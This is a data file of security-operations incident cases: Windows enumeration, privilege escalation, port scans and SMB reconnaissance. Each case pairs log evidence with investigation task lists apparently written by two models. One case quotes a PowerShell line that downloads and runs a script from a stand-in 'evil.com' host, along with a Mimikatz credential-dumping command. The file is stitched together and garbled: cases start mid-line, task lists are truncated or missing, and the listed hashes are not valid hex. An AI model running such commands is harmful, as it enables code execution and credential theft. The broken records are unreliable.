case_title: Enumeration activity on internal network identified via SMB, LDAP, and Nmap by source 10.0.0.15.
case_description: Firewall logs show inbound traffic from 10.0.0.15 to DC01 on ports 135, 137‑139, 445, 389; Nmap scan results from 10.0.0.15 to 10.0.0.0/24 revealing open ports 135, 139, 445 on hosts 10.0.0.12, 10.0.0.18, 10.0.0.25; Sysmon process creation events for nbtscan.exe, nmap.exe, and ldapsearch.exe executed from C:\Tools; Windows Security log Event ID 4662 indicating access to SMB shares on multiple servers; Snort IDS alert “PortScan” with source 10.0.0.15 ranging over ports 20‑1024; DNS query logs reveal frequent queries for internal zones corp.local, intranet.corp, and srv.corp; Netstat output from 10.0.0.15 shows multiple open TCP connections to internal hosts on ports 445 and 139; PowerShell logs record execution of Get‑WmiObject -Class Win32_ComputerSystem and Get‑ADUser cmdlets from remote host; File write event to C:\Scripts\enum_results.txt containing discovered SMB shares, usernames, and service names.
model_a_tasks:
Task #1
Title: Verify the legitimacy of host 10.0.0.15
Description: Cross‑reference 10.0.0.15 against the corporate asset inventory to confirm it is a legitimate workstation or server. Confirm its OS version, patch level, and any known scheduled tasks or monitoring tools that might explain the enumeration activity.

Task #2
Title: Correlate firewall and IDS port‑scan alerts
Description: Align the inbound traffic logs for 10.0.0.15 on ports 135, 137‑139, 445, 389 with the Snort “PortScan” alerts covering ports 20‑1024. Build a timeline to determine whether the scanning was continuous or bursty and verify any outbound responses or anomalies.

Task #3
Title: Identify SMB enumeration targets and scope
Description: Parse Windows Security Event ID 4662 logs for SMB share access on DC01 and other servers. Document the specific shares enumerated, target hosts (10.0.0.12, 10.0.0.18, 10.0.0.25), and any that contain sensitive data, then compare against configured share permissions.

Task #4
Title: Verify LDAP query legitimacy and scope
Description: Examine PowerShell logs that executed Get‑ADUser cmdlets and ldapsearch.exe command lines. Confirm the query filters, target domain controllers, and whether the returned data exceeds normal monitoring requirements.

Task #5
Title: Review nmap.exe execution parameters
Description: Analyze the Sysmon process creation event for nmap.exe, including the full command line. Verify that the scan targeted the expected IP range (10.0.0.0/24), the specific ports enumerated, and that no stealth or exploit modules were invoked.

Task #6
Title: Verify nbtscan.exe activity
Description: Inspect the Sysmon event for nbtscan.exe to confirm the target IPs, command‑line arguments, and number of queries. Check whether the activity matches standard NetBIOS enumeration or is excessive for routine operations.

Task #7
Title: Inspect netstat connections from 10.0.0.15
Description: Study TCP connections on ports 445 and 139 in the netstat output. Identify the remote IPs, connection states, and timestamps; cross‑reference these with SMB enumeration logs to confirm legitimate sessions or detect anomalies.

Task #8
Title: Analyze PowerShell WMI execution context
Description: For each Get‑WmiObject command run from 10.0.0.15, note the executing user, working directory, target machine, and WMI class queried. Compare these with the enumerated host list to determine whether WMI was used for lateral movement or privilege escalation.

Task #9
Title: Assess file write activity to enum_results.txt
Description: Open C:\Scripts\enum_results.txt and review its contents (SMB shares, usernames, service names). Cross‑check any discovered accounts or services against AD privileges and identify potential staging of sensitive data for exfiltration.

Task #10
Title: Evaluate DNS query patterns for internal zones
Description: Review frequent DNS queries to corp.local, intranet.corp, and srv.corp. Record the query types, unique hostnames, and frequency. Highlight any anomalous rates or unusual hostnames that could indicate active reconnaissance.

Task #11
Title: Determine if authentication used valid credentials
Description: Search Windows Security logs for successful and failed logons on hosts 10.0.0.15 and the enumerated targets. Verify the users involved, flag any privileged or service accounts, and check for lockout events or brute‑force patterns.

Task #12
Title: Conduct threat‑intelligence cross‑reference
Description: Query external threat‑intelligence feeds for the IP address 10.0.0.15 and the /24 subnet. Look for past incidents involving similar enumeration patterns, malware strands, or actor profiles that match the observed activity.

Task #13
Title: Recommend remediation and containment actions
Description: Summarize findings to determine risk level. If the host is compromised, isolate it immediately, reset any affected credentials, patch vulnerabilities, and monitor for persistence mechanisms or further lateral movement.

Task #14
Title: Build a comprehensive timeline of enumeration activity
Description: Merge firewall logs, Sysmon events, PowerShell logs, DNS queries, and Snort alerts into a chronological timeline to visualize the sequence of reconnaissance, enumeration, and data staging steps.

---

Task #11

Description: Aggregate timestamps from firewall logs, Nmap scan outputs, Sysmon process creations, SMB share access events, LDAP queries, PowerShell executions, and file writes. case_title: Suspicious privilege escalation attempt via scheduled task creation and local system service injection on multiple endpoints
case_description: Event ID 4672 (Special privileges assigned to new logon) on host WIN-01: user malicious_user logged in as administrator at 2024-03-01T08:12:45Z; Scheduled task creation event ID 4698 on host WIN-01: TaskName SystemMaintenance, User malicious_user, RunLevel Highest, scheduled at 2024-03-01T08:15:23Z; Sysmon event ID 1 (process creation) on host WIN-01: Image cmd.exe, CommandLine cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process C:\Temp\TrojScan.exe -Verb RunAs", Time 2024-03-01T08:16:10Z; Sysmon event ID 1 on host WIN-01: Image svchost.exe, CommandLine C:\Temp\TrojScan.exe, ServiceName TrojScanner, Time 2024-03-01T08:16:12Z; Sysmon event ID 12 (network connect) on host WIN-01: LocalAddr 10.0.0.5:445, RemoteAddr 10.0.0.20:445, Time 2024-03-01T08:16:20Z; Windows Security event ID 4728 (user added to group) on host WIN-01: User malicious_user added to Administrators group at 2024-03-01T09:02:05Z; Registry modification on host WIN-01: HKLM\SYSTEM\CurrentControlSet\Services\TrojScanner created with StartType=3, RunAs=LocalSystem, Time 2024-03-01T09:05:10Z; Executable C:\Temp\TrojScan.exe executed, SHA256 3B5ECE4F12DF3A6C7F1E2D4BAG45E6F8283... at 2024-03-01T09:05:15Z.
model_a_tasks:
Task #1
Title: Verify malicious_user account legitimacy and privileges
Description: Retrieve all logon, account creation, and group membership logs for malicious_user from domain controllers and local machines. Confirm the account’s intended purpose, creation timeline, and whether it should have administrative rights. Flag any recent orphaned or unclear account modifications.

Task #2
Title: Enumerate and flag malicious scheduled tasks
Description: Query Task Scheduler on all endpoints for tasks created by malicious_user, especially those with RunLevel Highest. Export task definitions, trigger times, and command lines for forensic analysis. Delete or disable tasks suspected of malicious intent.

Task #3
Title: Inspect TrojScanner service registration and execution
Description: List all services with name TrojScanner across endpoints. Verify the service executable path, start type, and permissions. Snapshot service configuration for comparison against known benign services.

Task #4
Title: Capture and compare registry entries for TrojScanner
Description: Export HKLM\SYSTEM\CurrentControlSet\Services\TrojScanner and related registry keys. Compare values such as StartType, RunAs, and binary path with baseline or known good configurations. Flag any unauthorized registry modifications.

Task #5
Title: Correlate Sysmon process creation events
Description: Analyze Sysmon event ID 1 logs for the period surrounding trojan execution. Identify child processes, command lines, and any hidden or obfuscated payloads. Connect processes to network events and scheduled task triggers.

Task #6
Title: Investigate SMB connection to 10.0.0.20:445
Description: Review firewall, NetFlow, and Sysmon event ID 12 logs for SMB traffic from WIN-01 to 10.0.0.20. Determine if files were accessed, copied, or moved. Cross‑reference with file share permissions to detect lateral movement attempts.

Task #7
Title: Scan host for TrojScan.exe and related malware
Description: Run full anti‑virus scans on WIN-01 and other endpoints. Verify SHA256 hash of TrojScan.exe against known malicious signatures. Examine file metadata, timestamps, and alternate data streams for hidden data or persistence indicators.

Task #8
Title: Track lateral movement of malicious_user across the network
Description: Search domain controller logs for remote logon events, scheduled tasks, and service creation initiated by malicious_user on other hosts. Identify any newly created admin accounts or service registrations outside WIN-01.

Task #9
Title: Aggregate privileged account additions across all hosts
Description: Collect Event ID 4728 logs from domain controllers and critical servers. Identify all users added to Administrators, Domain Admins, or other high‑privilege groups. Verify the legitimacy of each addition and flag any unexplained changes.

Task #10
Title: Analyze outbound SMB traffic patterns network‑wide
Description: Generate dashboards for SMB (port 445) traffic across the corporate network. Filter for unusual file sizes, repeated connections, or connections to external IPs. Cross‑check with known malicious IP blacklists.

Task #11
Title: Isolate WIN-01 and preserve forensic evidence
Description: Place WIN-01 in a quarantine network or air‑gap environment. Capture a memory dump, full disk image, and all relevant logs (Sysmon, Security, Application). Maintain strict chain‑of‑custody documentation.

Task #12
Title: Remediate malicious scheduled tasks, services, and registry
Description: Delete the malicious scheduled task, unregister the TrojScanner service, and remove any related registry keys. Re‑install legitimate service binaries if required. Apply appropriate patches and update configuration baselines.

Task #13
Title: Strengthen privileged account monitoring and policy enforcement
Description: Enforce stricter auditing for privileged account creation and modification. Deploy behavioral monitoring for scheduled tasks and service registrations. Update group policies to restrict RunLevel Highest and enforce least privilege principles.
model_b_tasks:
Task #1  
Title: Enumerate scheduled tasks created by malicious_user  
Description: Query the Task Scheduler on WIN‑01 to list all tasks created by malicious_user, focusing on those with RunLevel Highest and unusual trigger times. Cross‑reference with Sysmon event ID 4698 logs to confirm creation timestamps align with privilege escalation activity.  

Task #2  
Title: Validate execution context of suspicious scheduled task  
Description: Inspect properties of TaskName SystemMaintenance to confirm it runs with highest privileges under malicious_user. Determine its recurrence pattern and whether it has been configured for persistence beyond the first run.

Title: Audit TrojScanner service properties and registry keys  
Description: Retrieve service configuration for TrojScanner from SCM and the registry path HKLM\\SYSTEM\\CurrentControlSet\\Services\\TrojScanner. Verify the binary path, start mode (Manual or Automatic), dependencies, startup account (LocalSystem), and any authentication requirements set.

Title: Reconstruct command chain leading to TrojScanner execution  
Description: Follow the Sysmon event ID 1 chain from cmd.exe to PowerShell to TrojScan.exe. Examine command line arguments for flags or obfuscated code. Identify any child processes spawned by TrojScan.exe and whether they inherit malicious_user privileges.  

Task #5  
Title: Verify integrity of TrojScan.exe  
Description: Compare the SHA256 hash 3B5ECE4F12DF3A6C7F1E2D4BAG45E6F8283… against internal AV and IOC databases. If unknown, submit to external signature services (e.g., VirusTotal) and perform static/dynamic analysis to confirm malicious functionality.  

Task #6  
Title: Validate persistence mechanisms installed by trojan  
Description: Search for newly created services, scheduled tasks, registry run keys (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), and startup folder entries that reference TrojScan.exe or TrojScanner. Cross‑check Sysmon event ID 12 for network connections indicating updates or credential dumping.  

Task #7  
Title: Investigate SMB traffic to external host 10.0.0.20  
Description: Review Windows Firewall, Netmon, and Sysmon event ID 3 logs for SMB connections from WIN‑01 to 10.0.0.20 on port 445. Identify file transfers, accessed shared directories, authenticated usernames, and timestamp correlation with TrojScan.exe execution.  

Task #8  
Title: Cross-host correlation for similar privilege escalation attempts  
Description: Query the SOAR platform for Event ID 4672, 4698, and 4728 logged on other endpoints around 2024‑03‑01. Identify any other users or hosts engaged in similar activity; prioritize hosts with media or high-value assets.  

Task #9  
Title: Audit administrators group membership changes  
Description: Review Windows Security logs for any additions to the Administrators group. Trace back to malicious_user and any other anomalous additions. Verify legitimacy; if unauthorized, remove from group and investigate origin.  

Task #10  
Title: Perform endpoint hardening measures  
Description: Revoke malicious_user’s local administrative rights. Disable scheduled task creation permission for non‑privileged users if not required. Enforce Application Control policies (AppLocker or Software Restriction Policies) to block execution of unknown binaries from temporary directories.  

Task #11  
Title: Collect forensic artifacts from affected endpoint  
Description: Preserve volatile memory, disk images, full system event logs, and registry hives from WIN‑01. Capture list of running processes, network connections, and scheduled tasks for forensic lab analysis. Ensure chain‑of‑custody procedures are followed.  

Task #12  
Title: Generate incident report and update SOC playbooks  
Description: Summarize timelines, affected users, hosts, actions taken, and mitigation steps. Update SOAR playbooks for scheduled task and service‑based persistence detection. Share IOC hashes with internal threat intelligence database and external sharing communities. Make recommendations for future detection and prevention.

case_title: Suspicious port scanning activity detected from external IP 203.0.113.10 targeting internal servers
case_description:
- Firewall logs show 220 SYN packets from 203.0.113.10 to internal IP 10.10.10.5 on ports 22, 80, 443, 3306 within a 3‑minute window  
- Suricata IDS alert ID 5021 triggered at 09:45 UTC: “Port scan detected” source 203.0.113.10 destination 10.10.10.5  
- NetFlow record: 10,000 packets per minute from 203.0.113.10 to 10.10.10.0/24 with 95% SYN traffic  
- DNS logs: 203.0.113.10 issued queries for srv001.local, db01.local, ftp01.local  
- Syslog on 10.10.10.5: “Failed SSH login for user admin from 203.0.113.10”  
- Packet capture shows Nmap 7.80 fingerprint at 09:44 UTC, scanning all TCP ports on 10.10.10.0/24  
- Snort rule 2003453 fired: “TCP SYN scan” source 203.0.113.10
model_a_tasks:
Task #1  
Title: Verify Nmap Fingerprint in Packet Capture  
Description: Inspect the captured traffic to confirm the Nmap 7.80 fingerprint patterns (packet size, timing, and TCP flags). Re‑capture the data if needed to ensure the scan signature is accurate and to rule out false positives.  

Task #2  
Title: Correlate Firewall, IDS, and NetFlow Logs for 203.0.113.10  
Description: Aggregate the firewall log entries, Suricata IDS alerts, and NetFlow records for the 3‑minute window. Build a timeline showing the source IP, destination IPs, ports, and packet rates to confirm consistent port‑scan behavior and identify any additional target hosts.  

Task #3  
Title: Perform Threat‑Intelligence Lookup on 203.0.113.10  
Description: Query internal and external threat‑intelligence feeds for the source IP to determine if it appears on malicious IP lists, is associated with known scanners, or has prior activity against our domain. Document any findings that provide context for the scan.  

Task #4  
Title: Assess Vulnerability Exposure on Scanned Ports  
Description: Cross‑reference the scanned ports (22, 80, 443, 3306) against current internal vulnerability scans and patch status. Verify if exposed services are running outdated or weak versions (e.g., SSH weak auth, unpatched web server, MySQL default creds).  

Task #5  
Title: Review 10.10.10.5 Authentication and System Logs  
Description: Examine authentication logs (e.g., /var/log/auth.log, /var/log/secure) for any successful login attempts, account lockouts, or suspicious user activity following the failed SSH login. Also inspect system logs for process creation, privileged command execution, or file modifications that might indicate exploitation.  

Task #6  
Title: Investigate Internal DNS Query Patterns  
Description: Analyze DNS logs for queries to srv001.local, db01.local, ftp01.local to confirm whether the source IP was attempting to map internal services. Determine if these queries correlate with subsequent connections or if they were part of reconnaissance only.  

Task #7  
Title: Enhance Logging and Capture for Ongoing Scanning Activity  
Description: Deploy inline packet capture or deep packet inspection on 10.10.10.0/24 during the suspected scanning window. Enable verbose logging on relevant services (SSH, web, MySQL) to capture any additional exploitation attempts that may not be logged by default.  

Task #8  
Title: Implement IP Block and Monitor for Re‑attempts  
Description: Add a temporary firewall rule to drop traffic from 203.0.113.10 to the internal network while monitoring for attempts to circumvent the block. Verify if new scans or connections appear in the next 24‑hour window, and adjust thresholds or block permanently if repeated activity is detected.  

Task #9  
Title: Conduct Post‑Analysis Internal Network Segmentation Review  
Description: Verify that internal servers (10.10.10.5 and peers) are correctly segmented and that only authorized units can interact with them. Validate that connectivity is restricted to required business functions and that any exposed ports are defended via firewalls or intrusion‑prevention rules.  

Task #10  
Title: Produce Incident Summary and Recommendations  
Description: Compile findings from the above tasks into an incident report. Include timeline, evidence of scanning, any potential exploitation, and remediation steps such as patching, hardening of services, or re‑configuration of firewall rules. Present recommendations for future detection improvements (e.g., rate‑limit detection, better correlation rules).
model_b_tasks:
Task #1  
Title: Source IP reputation check  
Description: Query authoritative threat‑intel databases (AbuseIPDB, VirusTotal, Cisco Talos, PassiveTotal) for 203.0.113.10 to identify any prior malicious activity. Note any indicators such as repeated intrusion attempts, known malware distribution, or association with threat actors. Incorporate findings into the risk‑weight of this case.

Task #2  
Title: Port scanning pattern mapping  
Description: Aggregate firewall, IDS, and NetFlow logs to map the timeline of SYN packets from 203.0.113.10 to internal hosts. Identify which internal IPs received scans, the exact ports attempted, and the density of the scan (IP/port permutations per minute). Export a visual heat‑map of scan coverage across 10.10.10.0/24 for SOC briefing.

Task #3  
Title: Internal host vulnerability assessment  
Description: Validate advertised service versions on scanned ports (22, 80, 443, 3306) by banner grabbing or passive fingerprinting. Cross‑reference obtained versions with local patch management data and CVE databases. Document any unpatched vulnerabilities and estimate exploitation risk given scan depth.

Task #4  
Title: Failed SSH login investigation  
Description: Correlate firewall SYN logs with Syslog authentication failures for SSH on 10.10.10.5. Determine if “admin” is a legitimate internal user and track any subsequent successful authentication attempts from 203.0.113.10. Review PAM logs for account lockouts or resets that may indicate brute‑force activity.

Task #5  
Title: DNS query analysis for internal services  
Description: Examine DNS logs for queries made by 203.0.113.10 to srv001.local, db01.local, ftp01.local. Confirm existence and legitimacy of these internal services. Investigate whether any internal hosts resolved these queries or responded with spoofed records, which could signal lateral reconnaissance or MITM attempts.

Task #6  
Title: Packet capture deep dive  
Description: Perform a detailed analysis of the pcap that captured the Nmap 7.80 fingerprint. Verify scan type (e.g., SYN, ACK, FIN, Xmas) and intensity. Inspect traffic for anomalous payloads, hidden command tries, or exploit delivery against the scanned services. Confirm no additional malicious packets beyond reconnaissance were transmitted.

Task #7  
Title: IDS alert correlation review  
Description: Cross‑check Suricata ID 5021 “Port scan detected” and Snort rule 2003453 “TCP SYN scan” against the aggregated flow data. Ensure alignment of alert timestamps, source/destination IPs, and port ranges. Document any false positives, misclassifications, or missed alerts for tuning future detection rules.

Task #8  
Title: Outbound internal activity verification  
Description: Scrutinize internal firewall and NetFlow logs for any outbound connections from scanned hosts (10.10.10.0/24) to 203.0.113.10 after the scanning event. Look for data exfiltration patterns, unexpected HTTP/S/FTP traffic, or persistent keep‑alive probes that could indicate a foothold or credential compromise.

Task #9  
Title: Threat intel enrichment  
Description: Expand the profile of 203.0.113.10 using OSINT sources such as Shodan, CIRCL, and Recorded Future. Identify any associated domain registrations, historical malicious activity, or known exploit kits. Use geolocation services to determine point of origin and assess relevance to potential campaign attribution.

Task #10  
Title: Containment step formulation  
Description: Based on risk assessment, decide on containment action: immediate block of 203.0.113.10 at perimeter firewall, implementation of source‑IP rate limiting for SYN packets, or selective access control to vulnerable services. Coordinate with network admin for rule changes and document containment timeline.

Task #11  
Title: Patch and hardening validation  
Description: Verify that critical patches are applied to SSH (22), HTTP (80), HTTPS (443), and MySQL (3306) on the affected hosts. Harden SSH by enforcing key‑based authentication, disabling root login, and tightening PAM session limits. Apply web server hardening guidelines (TLS v1.2+, HSTS) and MySQL configuration best practices (disable root access over network).

Task #12  
Title: Monitoring rule creation  
Description: Author a SIEM correlation rule that triggers when a single external IP initiates >200 SYN packets to distinct internal hosts within 5 minutes, with coverage of >10 unique high‑risk ports (22, 80, 443, 3306). Add suppression logic to avoid alert fatigue from legitimate testing. Deploy rule across firewall, IDS, and NetFlow ingest points.

Task #13  
Title: Incident escalation and communication  
Description: Draft an incident brief summarizing findings, risk level, containment actions taken, pending remediation, and monitoring plans. Notify SOC Manager, System Owner of scanned servers, and Incident Response Lead. If block action approved, inform Operations to implement rule changes on the next maintenance window.

Task #14  
Title: Evidence preservation and documentation  
Description: Preserve firewall logs, IDS alerts, NetFlow summaries, DNS queries, pcap files, and all correlation rule outputs. Store evidence in the SOAR case management module with appropriate tagging for potential forensic analysis or regulatory reporting. Update case status to reflect progress on each investigation point.

case_title: Suspicious PowerShell script attempts privilege escalation via UAC bypass and scheduled task on workstation 202.
case_description: Process: PowerShell.exe (PID 5720) executed D:\scripts\admin.ps1 with -ExecutionPolicy Bypass; Event ID 4720: new local user 'attacker' created; Event ID 4697: scheduled task 'ElevateTask' created with /RL HIGHEST; Task executed as SYSTEM within 5 minutes; File: C:\Windows\Temp\evict.bat created by domain\john, SHA256: 1a2b3c4d5e6f7g8h9i0j; DLL: C:\Temp\loader.dll loaded, MD5: 9f91c9e9d3b605982557d08e6f1a2b3c; Outbound TCP to 203.0.113.42:443 with hex payload; Security log: Event ID 4672 for domain\john at 14:35:02; admin.ps1 modifies Local Group Policy to turn off UAC; Source of admin.ps1 unknown; Integrity level of loader.dll not recorded.
model_a_tasks:
Task #1
Title: Validate the authenticity and content of **admin.ps1**
Description: Compute the SHA256 hash of `D:\scripts\admin.ps1` using PowerShell’s `Get-FileHash` and compare it against known malware signatures. Perform a static analysis of the script, looking for Base64‑encoded payloads, `Invoke-Expression`, `Set-ItemProperty`, and any commands that modify local policy or create accounts. Ensure the script is not obfuscated or packed.

Task #2
Title: Confirm UAC settings were disabled by **admin.ps1**
Description: Query the registry key `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` and compare pre‑ and post‑alert values. Review Local Group Policy objects for changes to UAC or “User Account Control: Behavior of the elevation prompt for standard users.” Verify that the policy alteration is not present in a legitimate policy baseline.

Task #3
Title: Examine the **ElevateTask** scheduled task for persistence
Description: Retrieve the task definition using `schtasks /query /tn ElevateTask /v /fo LIST` or PowerShell `Get-ScheduledTask`. Verify the command, trigger, runlevel (`/RL HIGHEST`), and that it executes under the SYSTEM context. Check if the task action references `loader.dll` or `evict.bat` and confirm whether the task has an associated trigger that would allow repeated execution.

Task #4
Title: Investigate the newly created local user **attacker**
Description: Use `net localgroup administrators attacker` to verify membership in privileged groups. Correlate Event ID 4720 details (creation time, creator) with other logs to determine if the account is actively used (e.g., logon events for `attacker`). Check for any scheduled tasks or services that run under this account.

Task #5
Title: Determine the integrity level and permissions of **loader.dll**
Description: Examine the file ACL with `Get-Acl 'C:\Temp\loader.dll'` and the security descriptor in Process Explorer’s “View > Details > Security.” Confirm it is loaded in a SYSTEM process. Verify whether the integrity level is not marked “Protected” (i.e., not default low) and whether the file has any anomalous permissions allowing privileged modifications.

Task #6
Title: Audit the content of **evict.bat**
Description: Open `C:\Windows\Temp\evict.bat` and parse its commands. Look for instructions that delete or alter local accounts, registry keys, event logs, or other system files. Compare the file’s SHA256 and MD5 hashes to malware databases; if unknown, perform dynamic analysis in a sandbox to observe its runtime behavior.

Task #7
Title: Investigate the outbound TCP connection to **203.0.113.42:443**
Description: Inspect flow records, firewall logs, or a packet capture for the connection initiated by the PowerShell process or `loader.dll`. Decode the hex payload to determine whether it contains plaintext commands or encrypted traffic. Correlate the connection timestamp with the execution of the scheduled task and the creation of `evict.bat`.

Task #8

Description: Align timestamp 14:35:02 (Event ID 4672) with the creation of the scheduled task, the `admin.ps1` execution, and user creation events. Verify that *domain\john* performed privileged actions (e.g., creating a local user, launching a scheduled task) that may have enabled the subsequent malicious activity.

Task #9

Description: Enumerate startup folders, run registry keys (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`), and other scheduled tasks unrelated to legitimate functions. Scan the system for unknown executables, DLLs, and scripts, and evaluate them against YARA rules or antivirus signatures.

Description: Generate a local policy report with `gpresult /R /Scope:Computer` and `gpresult /R /Scope:User`. case_title: Suspicious privilege escalation attempted via PowerShell, Mimikatz, and group membership manipulation on a Windows domain controller
case_description:
- Windows Security Log (ID 4624) – user jdoe logged on to DC01 at 2025-10-12 09:45:12 (Logon Type 3).  
- Windows Security Log (ID 4732) – jdoe added to local Administrators group on DC01 at 2025-10-12 09:47:05.  
- Sysmon Process Creation (ID 1) – cmd.exe executed Powershell script C:\Temp\Elevate.ps1 at 2025-10-12 09:46:58 (Parent PID 1234).  
- PowerShell Transcript – executed: `Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://evil.com/steal.ps1'))`.  
- File creation – C:\Temp\Elevate.ps1 containing a Mimikatz payload.  
- File execution – mimikatz.exe run at 2025-10-12 09:47:30, executed `sekurlsa::logonpasswords`.  
- Netstat – outbound TCP to 203.0.113.42:443 from port 47856 initiated by mimikatz.exe.  
- Scheduled Task – EVILTASK created, set to run C:\Temp\Elevate.ps1 under the SYSTEM account at boot.  
- Registry modification – HKCU\Software\Microsoft\Windows\CurrentVersion\Run added EVILTASK pointing to C:\Temp\Elevate.ps1.  
- Credential dump – SAM database exported by mimikatz showing cleartext passwords for multiple accounts.  
- Observed suspicious activity: non‑admin user performing privileged actions, use of known credential dump tool, creation of persistence mechanism, outbound connection to external host.
model_a_tasks:
Task #1  
Title: Validate jdoe's login context on DC01  
Description: Review the Security Log 4624 entry for user jdoe to confirm the source IP, workstation, and authentication method used. Cross‑check this information against the domain’s usual logon patterns for non‑admin accounts to detect any anomalies and verify that this login corresponds to legitimate job activity.  

Task #2  
Title: Corroborate jdoe's addition to the Administrators group  
Description: Inspect Security Log 4732 and related audit logs to trace the user or process that added jdoe to the local Administrators group. Verify if jdoe had explicit permission to modify local groups, and check for any proxy or unapproved tool usage during the modification.  

Task #3  
Title: Investigate PowerShell script download and execution  
Description: Examine the PowerShell transcript for the `Invoke‑Expression` command that fetched `steal.ps1` from `evil.com`. Assess whether the download was blocked by network policy, and determine if the download host is blacklisted or known malicious.  

Task #4  
Title: Review contents of Elevate.ps1 for malicious code  
Description: Open `C:\Temp\Elevate.ps1` and enumerate all commands, especially those invoking external binaries like `mimikatz.exe`. Verify that the script contains the Mimikatz payload and identify any obfuscated or inline code that may indicate further malicious activity.  

Task #5  
Title: Verify Mimikatz usage and credential extraction  
Description: In the Sysmon logs, confirm the execution path of `mimikatz.exe` and review its command line to ensure the `sekurlsa::logonpasswords` module was invoked. Correlate the extracted SAM dump with known compromised accounts and check for readability or encryption of the dump file.  

Task #6  
Title: Analyze outbound connection from mimikatz.exe  
Description: Inspect the Netstat snapshot and any firewall logs showing a connection to `203.0.113.42:443`. Determine whether the connection was initiated by `mimikatz.exe` or another process, and capture packet payloads if possible to confirm data exfiltration or command‑and‑control communication.  

Task #7  
Title: Identify and assess persistence mechanisms  
Description: Verify the scheduled task `EVILTASK` creation, its trigger and action, and ensure it runs under the SYSTEM account at boot. Inspect the registry Run key for the EVILTASK entry, confirm its persistence level, and determine if any other persistence artifacts (e.g., WMI event subscriptions, DLL hijacking) exist on DC01.  

Task #8  
Title: Investigate potential lateral movement from DC01  
Description: Search the security and Sysmon logs for any additional `Logon Type 3` or `Logon Type 5` events using credentials from the SAM dump. Track any connections to other domain controllers, file servers, or workstations originating from DC01 after the compromise.  

Task #9  
Title: Search logs for other suspicious external connections  
Description: Expand the network investigation beyond the single log to include all outbound connections during the time window. Look for DNS queries to `evil.com` or related domains, any connections to additional IP addresses, and any failed attempts that might indicate lateral reconnaissance.  

Task #10

case_title: Unusual SMB enumeration traffic detected targeting internal file shares from an external IP address.
case_description:
- NIDS alert: 12,000 TCP SYN packets to port 445 from IP 203.17.18.29 over 10 minutes.  
- Windows Security Event ID 5145 (SMB file search) logged on server 'files01' for directory 'C:\Employees' 1,200 times from that IP.  
- NetFlow record shows 850 TCP SYNs to ports 135, 137, 138, 139, 445, 3268, and 3269 from the same source.  
- DNS logs display 300 queries for internal subdomains (e.g., 'sales.internal.corp', 'hr.internal.corp') from the external IP within a 30‑minute window.  
- LDAP audit logs record 94 failed bind attempts on Domain Controller 'dc01' originating from the IP.
model_a_tasks:
Task #1  
Title: Correlate event timestamps across all logs  
Description: Align the timestamps from the NIDS alert, NetFlow records, Windows Event ID 5145 logs, DNS query logs, and LDAP audit logs to confirm that all activities occurred concurrently. This correlation provides a unified timeline and ensures all data points refer to the same event window.

Task #2  
Title: Profile the source IP against threat‑intel feeds  
Description: Query internal and external threat‑intelligence services for 203.17.18.29 to obtain its historical activity, reputation, and known malware or exploit associations. Document any matches that support or refute an adversary pattern.

Task #3  
Title: Review firewall and perimeter logs for inbound SMB traffic  
Description: Inspect the firewall logs for inbound connections to ports 445, 135, 137, 138, 139, 3268, and 3269 originating from 203.17.18.29. Determine if these connections were allowed, dropped, or denied and capture any associated session details.

Task #4  
Title: Analyze Windows Security Event 5145 logs for enumeration tactics  
Description: Deep‑parse the 1,200 SMB 5145 events on 'files01' to identify the user accounts used, file paths accessed, and the success/failure status. Check for anomalies such as repeated access to sensitive directories or use of the SYSTEM account.

Task #5  
Title: Conduct endpoint analysis on 'files01' and 'dc01'  
Description: Run EDR/Host‑based IDS agents to collect recent process trees, file modifications, registry changes, and memory dumps for both servers. Search for indicators of credential dumping (e.g., Mimikatz signatures) or malicious scripts launched during the enumeration period.

Task #6  
Title: Correlate LDAP failed bind attempts to enumeration patterns  
Description: Scrutinize the 94 failed LDAP binds on 'dc01' for usernames, bind types, and attempted authentication methods. Look for patterns of brute‑force or pass‑the‑hash activity that could indicate credential reconnaissance.

Task #7  
Title: Evaluate DNS query logs for unauthorized recursion  
Description: Review the 300 DNS queries for internal subdomains to determine if the external IP forced DNS recursion or poisoned responses. Confirm whether the queries were served by internal DNS servers or were spoofed/redirected.

Task #8  
Title: Extend NetFlow analysis to detect follow‑on connections  
Description: Expand the NetFlow inspection to cover the full 30‑minute window and beyond, looking for new session attempts on ports 139, 445, 3389, and other lateral‑movement vectors. Note any successful handshakes or anomalous traffic flows.

Task #9  
Title: Enforce a temporary block of the source IP  
Description: Use the perimeter firewall to block 203.17.18.29 on all SMB, RPC, and LDAP ports. Verify that the block is effective and monitor for any new attempts or error logs indicating evasion.

Task #10  
Title: Compile incident findings and recommend remediation  
Description: Summarize all collected evidence, assess the impact, and produce an incident report. Recommend policy changes (e.g., deny inbound SMB, enable DNS recursion restrictions), patch updates, and continuous monitoring on affected hosts. Schedule a post‑remediation review to confirm that the threat vector has been neutralized.
model_b_tasks:
Task #1  
Title: Gather SMB event logs for the suspicious IP  
Description: Pull all SMB-related Windows security events (IDs 5140, 5144, 5145, 5146, 5150) from file servers and domain controllers for IP 203.17.18.29 during 12:00‑12:30 UTC. Focus on share listings, denied accesses, and session setups to map the enumeration pattern.

Task #2  
Title: Correlate NetFlow SMB traffic with DNS enumeration logs  
Description: Match the NetFlow record of 850 SYNs to SMB/NetBIOS ports with the 300 DNS queries for internal subdomains issued by the same IP. Look for sequential or hierarchical querying that suggests systematic reconnaissance.

Task #3  
Title: Review LDAP bind failures for authentication attempts  
Description: Export Domain Controller ‘dc01’ LDAP audit logs for failed binds from the external IP. Analyze username patterns, frequency, and lockout notifications (Event ID 4740) to detect password spraying or credential guessing.

Task #4  
Title: Inspect SMB authentication protocols used  
Description: Examine SMB logs to see whether the source IP attempted legacy protocols such as SMBv1 or NTLMv1. Identify usage of weak authentication that could facilitate exploitation of known SMB weaknesses.

Task #5  
Title: Verify firewall rules for SMB ports compliance  
Description: Check inbound rule configurations on perimeter firewalls and NSGs for ports 445, 135, 137–139, 3268, 3269. Ensure only trusted network ranges are allowed and that any recent changes correlate with the traffic spike.

Task #6  
Title: Assess SMB traffic volume versus established baseline  
Description: Compute average bytes and packets per minute for SMB-related ports on affected servers over the past month. Quantify how the 12‑minute spike deviates, flagging it as anomalous if > 3σ above baseline.

Task #7  
